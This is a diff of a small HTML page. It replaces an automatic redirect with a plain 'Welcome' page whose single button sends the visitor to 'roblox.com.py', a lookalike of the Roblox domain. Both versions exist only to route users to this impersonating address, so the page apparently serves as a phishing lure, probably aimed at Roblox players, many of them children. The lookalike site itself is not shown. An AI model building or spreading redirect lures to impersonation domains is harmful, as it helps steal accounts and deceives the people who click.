@@ -1,12 +1,66 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-    <meta charset="UTF-8">
-    <title>Redirecting...</title>
-    <script>
-        window.location.replace("https://roblox.com.py/users/7074125057/profile");
-    </script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Welcome</title>
+
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: Arial, sans-serif;
+    }
+
+    body {
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+    }
+
+    .container {
+        text-align: center;
+    }
+
+    h1 {
+        color: white;
+        margin-bottom: 40px;
+        font-size: 32px;
+        letter-spacing: 2px;
+    }
+
+    button {
+        padding: 15px 50px;
+        font-size: 20px;
+        border: none;
+        border-radius: 50px;
+        cursor: pointer;
+        background: white;
+        transition: 0.3s ease;
+    }
+
+    button:hover {
+        transform: scale(1.1);
+        box-shadow: 0 10px 30px rgba(0,0,0,0.4);
+    }
+</style>
 </head>
+
 <body>
+
+<div class="container">
+    <h1>Welcome</h1>
+    <button onclick="go()">Click</button>
+</div>
+
+<script>
+function go() {
+    window.location.href = "https://roblox.com.py/users/7074125057/profile";
+}
+</script>
+
 </body>
 </html>
